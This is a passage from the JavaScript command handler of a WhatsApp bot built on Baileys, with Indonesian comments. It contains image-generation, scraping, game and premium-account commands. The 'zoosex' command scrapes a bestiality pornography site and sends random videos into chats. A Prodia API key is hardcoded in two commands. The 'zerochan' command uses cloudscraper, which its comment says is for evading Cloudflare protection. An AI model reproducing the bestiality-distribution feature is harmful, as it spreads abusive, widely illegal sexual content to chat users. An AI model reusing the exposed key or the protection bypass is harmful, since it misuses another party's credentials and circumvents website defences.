 sky.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 }).catch(error => {
 m.reply('❗ Terjadi kesalahan: ' + error);
 });
}
break;



case 'url': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `${pushname}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Hai`
 }), 
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"url","url":"https://avosky.id","merchant_url":"avosky.com"}`
 }, 
 ],
 })
 })
 }
 }
}, {})

sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'text2img': {
 const { Prodia } = require("prodia.js");
 const apiKey = "83a7fb64-1fd8-42b1-89ed-a54f1803f6fc";
 const prodia = Prodia(apiKey);
 const generateImage = async (prompt, model) => {
 try {
 const result = await prodia.generateImage({
 prompt: prompt,
 model: model
 });
 return await prodia.wait(result);
 } catch (error) {
 console.error("Error generating image:", error);
 throw error;
 }
 };
 
 const input_data = await prodia.getModels();
 let [urutan, tema] = text.split("|");
 
 // Check if the user wants to see the list of models
 if (text.toLowerCase() === 'list') {
 const modelList = input_data.map((item, index) => `${index + 1}. ${item.replace(/[_-]/g, ' ').replace(/\..*/, '')}`).join("\n");
 return m.reply(`Available models:\n${modelList}`);
 }
 
 if (!tema) return m.reply("Contoh Text2img 4|girl");
 await m.reply("Processing your request...");

 try {
 let data = input_data.map((item) => ({
 title: item.replace(/[_-]/g, ' ').replace(/\..*/, ''),
 id: item
 }));
 if (!urutan || isNaN(urutan) || urutan < 1 || urutan > data.length) {
 return m.reply("Input query!\n*Example:*\n.txt2img [nomor]|[query]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"));
 }
 let out = data[urutan - 1].id; 
 const imageResult = await generateImage(tema, out); 
 if (imageResult) {
 await sky.sendMessage(m.chat, {
 image: {
 url: imageResult.imageUrl 
 },
 caption: `> thanks for using my bot😋`, 
 }, {
 quoted: m
 });
 } else {
 console.log("Tidak ada respon atau terjadi kesalahan.");
 }
 } catch (e) {
 console.error("Error in text2img case:", e);
 await m.reply(`Terjadi kesalahan: ${e.message}`);
 }
}
break;










 case 'c-img': {
  if (!isPrem) return replyprem(mess.premium)
    const uploadImage = require('./lib/uploadImage');
    const fs = require('fs');
    const { Prodia } = require("prodia.js");
    const modelList = [
  "3Guofeng3_v34.safetensors [50f420de]",
  "absolutereality_V16.safetensors [37db0fc3]",
  "absolutereality_v181.safetensors [3d9d4d2b]",
  "amIReal_V41.safetensors [0a8a2e61]",
  "analog-diffusion-1.0.ckpt [9ca13f02]",
  "aniverse_v30.safetensors [579e6f85]",
  "anythingv3_0-pruned.ckpt [2700c435]",
  "anything-v4.5-pruned.ckpt [65745d25]",
  "anythingV5_PrtRE.safetensors [893e49b9]",
  "AOM3A3_orangemixs.safetensors [9600da17]",
  "blazing_drive_v10g.safetensors [ca1c1eab]",
  "breakdomain_I2428.safetensors [43cc7d2f]",
  "breakdomain_M2150.safetensors [15f7afca]",
  "cetusMix_Version35.safetensors [de2f2560]",
  "childrensStories_v13D.safetensors [9dfaabcb]",
  "childrensStories_v1SemiReal.safetensors [a1c56dbb]",
  "childrensStories_v1ToonAnime.safetensors [2ec7b88b]",
  "Counterfeit_v30.safetensors [9e2a8f19]",
  "cuteyukimixAdorable_midchapter3.safetensors [04bdffe6]",
  "cyberrealistic_v33.safetensors [82b0d085]",
  "dalcefo_v4.safetensors [425952fe]",
  "deliberate_v2.safetensors [10ec4b29]",
  "deliberate_v3.safetensors [afd9d2d4]",
  "dreamlike-anime-1.0.safetensors [4520e090]",
  "dreamlike-diffusion-1.0.safetensors [5c9fd6e0]",
  "dreamlike-photoreal-2.0.safetensors [fdcf65e7]",
  "dreamshaper_6BakedVae.safetensors [114c8abb]",
  "dreamshaper_7.safetensors [5cf5ae06]",
  "dreamshaper_8.safetensors [9d40847d]",
  "edgeOfRealism_eorV20.safetensors [3ed5de15]",
  "EimisAnimeDiffusion_V1.ckpt [4f828a15]",
  "elldreths-vivid-mix.safetensors [342d9d26]",
  "epicphotogasm_xPlusPlus.safetensors [1a8f6d35]",
  "epicrealism_naturalSinRC1VAE.safetensors [90a4c676]",
  "epicrealism_pureEvolutionV3.safetensors [42c8440c]",
  "ICantBelieveItsNotPhotography_seco.safetensors [4e7a3dfd]",
  "indigoFurryMix_v75Hybrid.safetensors [91208cbb]",
  "juggernaut_aftermath.safetensors [5e20c455]",
  "lofi_v4.safetensors [ccc204d6]",
  "lyriel_v16.safetensors [68fceea2]",
  "majicmixRealistic_v4.safetensors [29d0de58]",
  "mechamix_v10.safetensors [ee685731]",
  "meinamix_meinaV9.safetensors [2ec66ab0]",
  "meinamix_meinaV11.safetensors [b56ce717]",
  "neverendingDream_v122.safetensors [f964ceeb]",
  "openjourney_V4.ckpt [ca2f377f]",
  "pastelMixStylizedAnime_pruned_fp16.safetensors [793a26e8]",
  "portraitplus_V1.0.safetensors [1400e684]",
  "protogenx34.safetensors [5896f8d5]",
  "Realistic_Vision_V1.4-pruned-fp16.safetensors [8d21810b]",
  "Realistic_Vision_V2.0.safetensors [79587710]",
  "Realistic_Vision_V4.0.safetensors [29a7afaa]",
  "Realistic_Vision_V5.0.safetensors [614d1063]",
  "Realistic_Vision_V5.1.safetensors [a0f13c83]",
  "redshift_diffusion-V10.safetensors [1400e684]",
  "revAnimated_v122.safetensors [3f4fefd9]",
  "rundiffusionFX25D_v10.safetensors [cd12b0ee]",
  "rundiffusionFX_v10.safetensors [cd4e694d]",
  "sdv1_4.ckpt [7460a6fa]",
  "v1-5-pruned-emaonly.safetensors [d7049739]",
  "v1-5-inpainting.safetensors [21c7ab71]",
  "shoninsBeautiful_v10.safetensors [25d8c546]",
  "theallys-mix-ii-churned.safetensors [5d9225a4]",
  "timeless-1.0.ckpt [7c4971d4]",
  "toonyou_beta6.safetensors [980f6b15]"
    ];
    const samplerList = [
  "DPM++ 2M Karras",
  "DPM++ SDE Karras",
  "DPM++ 2M SDE Exponential",
  "DPM++ 2M SDE Karras",
  "Euler a",
  "Euler",
  "LMS",
  "Heun",
  "DPM2",
  "DPM2 a",
  "DPM++ 2S a",
  "DPM++ 2M",
  "DPM++ SDE",
  "DPM++ 2M SDE",
  "DPM++ 2M SDE Heun",
  "DPM++ 2M SDE Heun Karras",
  "DPM++ 2M SDE Heun Exponential",
  "DPM++ 3M SDE",
  "DPM++ 3M SDE Karras",
  "DPM++ 3M SDE Exponential",
  "DPM fast",
  "DPM adaptive",
  "LMS Karras",
  "DPM2 Karras",
  "DPM2 a Karras",
  "DPM++ 2S a Karras",
  "Restart",
  "DDIM",
  "PLMS",
  "UniPC"
    ];

    if (!q) return m.reply(`Where is the prompt? Use 'c-img list' to see the available models and samplers or 'c-img modelIndex,samplerIndex,prompt' to process an image.`);

    const args = q.split(',');
    
    if (args[0].toLowerCase() === 'list') {
        let modelMessage = "Available Models:\n" + modelList.map((model, index) => `${index + 1}. ${model}`).join('\n');
        let samplerMessage = "Available Sampler:\n" + samplerList.map((sampler, index) => `${index + 1}. ${sampler}`).join('\n');
        return m.reply(`${modelMessage}\n\n${samplerMessage}`);
    }

    if (args.length < 3) return m.reply(`Please provide model index, sampler index, and prompt. Example: c-img 2,5,give colorful`);

    const modelIndex = parseInt(args[0]) - 1;
    const samplerIndex = parseInt(args[1]) - 1;
    const prompt = args.slice(2).join(',').trim();

    if (modelIndex < 0 || modelIndex >= modelList.length || samplerIndex < 0 || samplerIndex >= samplerList.length) {
        return m.reply(`Invalid model or sampler index.`);
    }

    const selectedModel = modelList[modelIndex];
    const selectedsampler = samplerList[samplerIndex];

    // Download and save media message
    let media = await sky.downloadAndSaveMediaMessage(qmsg);
    let buffer = fs.readFileSync(media);

    // Upload image to get the URL
    let url = await uploadImage(buffer);

    // Prodia API initialization with the provided key
    const { transform, wait } = Prodia("83a7fb64-1fd8-42b1-89ed-a54f1803f6fc");

    // Function to process image using Prodia API
    const input = async (imageUrl, model, sampler, prompt) => {
        const result = await transform({
            imageUrl: imageUrl,
            prompt: prompt,
            model: model,
            style_preset: `enhance`,  
            sampler: sampler,
            cfg_scale: 9,
            steps: 30,
            width: 512,
            height: 768
        });

        // Wait for the result and return it
        return await wait(result);
    }

    // Processing image with prompt
    let result = await input(url, selectedModel, selectedsampler, prompt);

    // Send the resulting image using the returned URL from Prodia
    sky.sendMessage(m.chat, { 
        image: { url: result.imageUrl }, 
        caption: `> Success` 
    });

    // Optionally delete the saved media if not needed anymore
    fs.unlinkSync(media);
}
break
case 'zoosex': {
 if (!isPrem) return replyprem(mess.premium)
 const cheerio = require('cheerio');
 const axios = require('axios');

 async function fetchVideoUrls(page = '') {
 try {
 // Tentukan URL berdasarkan input halaman
 let baseUrl = page ? `https://zoosexfarm.com/${page}/index.html` : 'https://zoosexfarm.com/index.html';

 // Cek batas halaman, maksimal 19
 if (page && (isNaN(page) || page < 1 || page > 19)) {
 return m.reply('Page tidak valid! Masukkan angka antara 1 hingga 19.');
 }

 const { data } = await axios.get(baseUrl);
 const $ = cheerio.load(data);
 const urls = [];

 // Ambil semua URL halaman konten
 $('a[href^="/"][data-thumb-id]').each((index, element) => {
 const href = $(element).attr('href');
 const fullUrl = `https://zoosexfarm.com${href}`;
 urls.push(fullUrl);
 });

 const videoUrls = [];
 for (const url of urls) {
 const pageData = await axios.get(url);
 const $page = cheerio.load(pageData.data);

 // Ambil URL video dari elemen <video>
 const videoUrl = $page('#videoShowArea .playerArea video').attr('src');
 if (videoUrl) {
 videoUrls.push(videoUrl);
 }
 }

 if (videoUrls.length > 0) {
 const randomVideoUrl = videoUrls[Math.floor(Math.random() * videoUrls.length)];
 sky.sendMessage(m.chat, { caption: `Random Zoo Sex Video`, video: { url: `${randomVideoUrl}` } }, { quoted: m });
 } else {
 m.reply('No video URLs found.');
 }

 } catch (error) {
 m.reply(`Error fetching the page or video URLs: ${error.message}`);
 }
 }

 // Ambil input page dari perintah jika ada, jika tidak kosong
 let inputPage = m.text.split(' ')[1]; // Mendapatkan input setelah kata 'zoosex'
 fetchVideoUrls(inputPage);
}
break

case 'delprem': {
 const fs = require('fs');
 const path = './database/premium.json';

 if (fs.existsSync(path)) {
 let premiumData = JSON.parse(fs.readFileSync(path));

 let args = m.text.split(' ');
 if (args.length < 2 || isNaN(args[1])) {
 return m.reply('Format salah. Gunakan: delprem [nomor urutan]');
 }

 let indexToDelete = parseInt(args[1]) - 1;

 if (indexToDelete >= 0 && indexToDelete < premiumData.length) {
 let deletedUser = premiumData.splice(indexToDelete, 1);

 fs.writeFileSync(path, JSON.stringify(premiumData, null, 2));

 m.reply(`Nomor premium ${deletedUser} berhasil dihapus.`);
 } else {
 m.reply('Nomor urutan tidak valid.');
 }
 } else {
 m.reply('File database premium tidak ditemukan.');
 }
}
break;
case 'ddc': {
 const decryptFunction = (encryptedCode) => {
 // Define the decryption logic here.
 // For the sake of this example, let's assume we have a basic substitution method.
 // Replace this with the actual decryption logic based on your needs.
 
 let decrypted = '';
 for (let i = 0; i < encryptedCode.length; i++) {
 // Example logic: shifting characters (simple caesar cipher)
 decrypted += String.fromCharCode(encryptedCode.charCodeAt(i) - 1); // Adjust the shift as needed
 }
 return decrypted;
 };

 const encryptedInput = m.text; // Assuming m.text contains the input text to decrypt
 const decryptedOutput = decryptFunction(encryptedInput);
 
 m.reply(decryptedOutput);
}
break;







case 'disk': {
 let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

 await m.reply(`Please Wait`)
 let o
 try {
 o = await exec('cd && du -h --max-depth=1')
 } catch (e) {
 o = e
 } finally {
 let { stdout, stderr } = o
 if (stdout.trim())
 m.reply(stdout)
 if (stderr.trim()) m.reply(stderr)
 }
}
break




case 'sky': {
 if (!text) return m.reply("_lu manggil gua_");

 const axios = require('axios');

 async function luminAi(teks, pengguna = null, prompt = null, modePencarianWeb = false, imageBuffer = null) {
 try {
 const data = { content: teks };
 if (pengguna !== null) data.user = pengguna;
 if (prompt !== null) data.prompt = prompt;
 data.webSearchMode = modePencarianWeb;
 if (imageBuffer !== null) data.imageBuffer = imageBuffer;

 const response = await axios.post("https://luminai.my.id/", data);
 return response.data.result;
 } catch (error) {
 console.error('Terjadi kesalahan:', error);
 throw error; // Rethrow the error to handle it in the caller function
 }
 }
 const teks = args.join(' ');
 const pengguna = `${m.sender.split('@')[0]}`; 
 const prompt = `sekarang peran kamu adalah seseorang bernama avosky dan kamu juga adalah orang yang sangat baik sopan dan penuh humoris dan kamu wajib menjawab semua pertanyaan dari orang dengan baik dan gunakan kata kata kekinian yang moderen dan sertakan kaomoji kamoji sopan, 1 hal wajib kamu harus menjawab semua pertanyaan dengan bahasa Indonesia saja`;
 const modePencarianWeb = true;

 try {
 let result;
if (quoted && (/image/.test(quoted.mimetype) || /video/.test(quoted.mimetype))) {
 const mediaBuffer = await quoted.download();
 result = await luminAi(teks, pengguna, prompt, modePencarianWeb, mediaBuffer);
} else {
 result = await luminAi(teks, pengguna, prompt, modePencarianWeb);
 }
 m.reply(`${result}`);
 } catch (error) {
 m.reply('Terjadi kesalahn.');
 console.error('Error:', error);
 }
}
break
case 'decode': {
 // Ambil teks yang akan di-decode dari input pengguna
 let encodedText = m.text.split(' ')[1];
 
 // Fungsi untuk mendecode URL hingga mencapai hasil akhir
 function decodeRepeatedly(text) {
 let decoded = decodeURIComponent(text); // Decode sekali
 while (decoded !== text) { // Cek apakah perlu di-decode lagi
 text = decoded;
 decoded = decodeURIComponent(text);
 }
 return decoded;
 }

 // Panggil fungsi untuk decode URL
 let decodedURL = decodeRepeatedly(encodedText);

 // Kirim hasil decode ke user
 m.reply(`Decoded URL: ${decodedURL}`);
}
break;
case 'user': {
if (!isCreator) return m.reply(mess.owner)
 const usersList = Object.keys(db.data.users);
 const totalUsers = usersList.length;

 if (totalUsers === 0) {
 m.reply('Belum ada pengguna terdaftar.');
 } else {
 const userListText = usersList.map((user, index) => `${index + 1}. @${user}`).join('\n');
 m.reply(`Total pengguna: ${totalUsers}\nDaftar Pengguna:\n${userListText}`);
 }
}
 break
case 'bilibili': {
 const axios = require('axios');
 const cheerio = require('cheerio');

 async function fetchBilibiliData(query) {
 try {
 const response = await axios.get(`https://www.bilibili.tv/id/search-result?q=${query}`);
 const $ = cheerio.load(response.data);
 const results = [];

 $('p.highlights').each((i, el) => {
 const title = $(el).find('i').map((_, iEl) => $(iEl).text()).get().join(' ').trim();
 const anchor = $(el).closest('a');
 const playUrl = anchor.attr('href') ? `https://www.bilibili.tv${anchor.attr('href')}` : '';
 const imageUrl = $(el).closest('.bstar-video-card__text-wrap')
 .find('img.bstar-image__img')
 .attr('src') || '';
 results.push({ title, playUrl, imageUrl });
 });

 return results;
 } catch (error) {
 console.error('Error fetching titles, play URLs, and image URLs:', error.message);
 return null;
 }
 }

 const query = text;
 if (!query) {
 m.reply('Tolong masukkan query pencarian.');
 return;
 }

 const results = await fetchBilibiliData(query);

 if (!results || results.length === 0) {
 m.reply('Tidak ditemukan hasil untuk pencarian tersebut.');
 return;
 }

 const resultText = results.map((item, index) => {
 return `> ${index + 1}. ${item.title}\nLink: ${item.playUrl}\nImage: ${item.imageUrl}\n`;
 }).join('\n\n');

 m.reply(`Hasil pencarian untuk "${query}":\n\n${resultText}`);
}
break;


case 'sfile': {
async function sfileSearch(query, page = 1) {
let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
let $ = cheerio.load(await res.text())
let result = []
$('div.list').each(function () {
let title = $(this).find('a').text()
let size = $(this).text().trim().split('(')[1]
let link = $(this).find('a').attr('href')
if (link) result.push({ title, size: size.replace(')', ''), link })
})
return result
}
	
async function sfileDl(url) {
let res = await fetch(url)
let $ = cheerio.load(await res.text())
let filename = $('div.w3-row-padding').find('img').attr('alt')
let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
let filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
let download = $('#download').attr('href') + '&k=' + Math.floor(Math.random() * (15 - 10 + 1) + 10)
return { filename, filesize, mimetype, download }
}
		
if (q.match(/(https:\/\/sfile.mobi\/)/gi)) {
let res = await sfileDl(q)
if (!res) return m.reply('Error :/')
await m.reply(Object.keys(res).map(v => `*• ${v}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
sky.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
} else if (q) {
let [query, page] = q.split`|`
let res = await sfileSearch(query, page)
if (!res.length) return m.reply( `Query "${text}" not found :/`)
let rus = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
m.reply(rus)
} else return m.reply( 'Input Query / Sfile Url!')
}
break




case 'zerochan': {
 if (!q) return m.reply('Masukkan kata kunci pencarian.');

 const cloudscraper = require('cloudscraper');
 const cheerio = require('cheerio');

 async function scrapeZerochan(query) {
 const url = `https://www.zerochan.net/search?q=${query}`;

 try {
 // Menggunakan cloudscraper untuk menghindari perlindungan Cloudflare
 const data = await cloudscraper.get(url);
 const $ = cheerio.load(data);
 const results = [];

 // Memperbaiki pemilihan elemen
 $('.thumb').each((index, element) => {
 const imgElement = $(element).find('img');
 const imgSrc = imgElement.attr('src');
 const imgAlt = imgElement.attr('alt');
 const imgWidth = imgElement.attr('width');
 const imgHeight = imgElement.attr('height');

 // Pastikan semua atribut ada
 if (imgSrc && imgAlt && imgWidth && imgHeight) {
 results.push({
 src: imgSrc,
 alt: imgAlt,
 width: imgWidth,
 height: imgHeight
 });
 }
 });

 // Kirim hasilnya
 if (results.length > 0) {
 // Memilih gambar acak
 const randomIndex = Math.floor(Math.random() * results.length);
 const randomImage = results[randomIndex];

 // Mengirimkan gambar dengan caption menggunakan sky.sendMessage
 sky.sendMessage(m.chat, { 
 image: { url: randomImage.src }, 
 caption: `${randomImage.alt}\nWidth: ${randomImage.width}\nHeight: ${randomImage.height}\nURL: ${randomImage.src}` 
 });
 } else {
 m.reply('No images found.');
 }

 } catch (error) {
 console.error('Error fetching data:', error);
 m.reply('Failed to fetch data from Zerochan.');
 }
 }

 // Contoh pemanggilan fungsi dengan query yang diberikan
 await scrapeZerochan(q);
}
break;


//ADDF
       case 'bug': {
    let Message = { text: `Serem Ih`};   
  }
  break;
              case 'bagi':{
    let Message = { text: `Bagi Apa Kak >//<`};   
    sky.sendMessage(m.chat, Message, { quoted: fkontak });
  }
  break
  case 'buyprem': {
    const userBalance = db.data.users[m.sender]?.balance || 0;

    if (userBalance < 2000000) {
        m.reply('Maaf, saldo Anda tidak mencukupi untuk membeli status premium.');
        return;
    }

    const prrkek = m.sender.replace('@s.whatsapp.net', '') + `@s.whatsapp.net`;

    if (prem.includes(prrkek)) {
        m.reply('Maaf, Anda sudah memiliki status premium. Tidak dapat membeli status premium lebih dari sekali.');
        return;
    }

    const ceknya = await sky.onWhatsApp(prrkek);

    if (ceknya.length === 0) {
        m.reply('Maaf, terjadi kesalahan saat mengambil nomor Anda.');
        return;
    }

    // Mengurangkan saldo dan menambahkan nomor ke daftar premium
    db.data.users[m.sender].balance -= 2000000;
    prem.push(prrkek);
    fs.writeFileSync('./database/premium.json', JSON.stringify(prem));

    m.reply(`Nomor Anda sekarang memiliki status premium. Saldo Anda sekarang: Rp.${db.data.users[m.sender].balance}.`);
}
    break
             
        case 'chats': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!isCreator) return m.reply(mess.owner)
                if (!q) return m.reply('Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
                if (args[0] === 'mute') {
                    sky.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    sky.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    sky.chatModify({ archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    sky.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    sky.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    sky.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    sky.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
        break
	    case 'family100': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await sky.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
case 'setexif': 
                if (!isCreator) return mess.owner
                if (!text) return `Contoh : ${prefix + command} packname|author`
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                m.reply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
            
            break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
  if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`;
  ter = command[1].toLowerCase();
  tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text;
  m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()));
  break;
            case "sepuh":{
               yui = fs.readFileSync('./src/insecure.opus')
               sky.sendMessage(m.chat,{
               audio: yui, 
               mimetype:'audio/mpeg', ptt:true,
        contextInfo:{
        externalAdReply:{
            title: `kamu pemula ya ${pushname}`,
            body: 'sepuhhh',
            thumbnail: fs.readFileSync('./src/pemula.jpg'),
            mediaType:2,
            mediaUrl: 'https://telegra.ph/file/26a54d3ae881dcb37ed3d.jpg',
        }

    },
},{quoted:fkontak})               
}
               break
            case 'tebak': {
 if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 5 // -1 limit
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. gambar\n2. kata\n3. kalimat\n4. lirik\n5. lontong`
 if (args[0].toLowerCase() === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await sky.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
 sky.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply(`Waktu Habis\nJawaban: ${tebaklagu[m.sender.split('@')[0]]}`)
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0].toLowerCase() === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 sky.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply(`Waktu Habis\nJawaban: ${tebakgambar[m.sender.split('@')[0]]}`)
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0].toLowerCase() === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 sky.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply(`Waktu Habis\nJawaban: ${tebakkata[m.sender.split('@')[0]]}`)
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0].toLowerCase() === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 sky.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply(`Waktu Habis\nJawaban: ${tebakkalimat[m.sender.split('@')[0]]}`)
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0].toLowerCase() === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 sky.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply(`Waktu Habis\nJawaban: ${tebaklirik[m.sender.split('@')[0]]}`)
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0].toLowerCase() === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 sky.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		 caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply(`Waktu Habis\nJawaban: ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}`)
 delete caklontong[m.sender.split('@')[0]]
		 delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
 }
 break
                        case 'kuismath': case 'math': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                sky.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
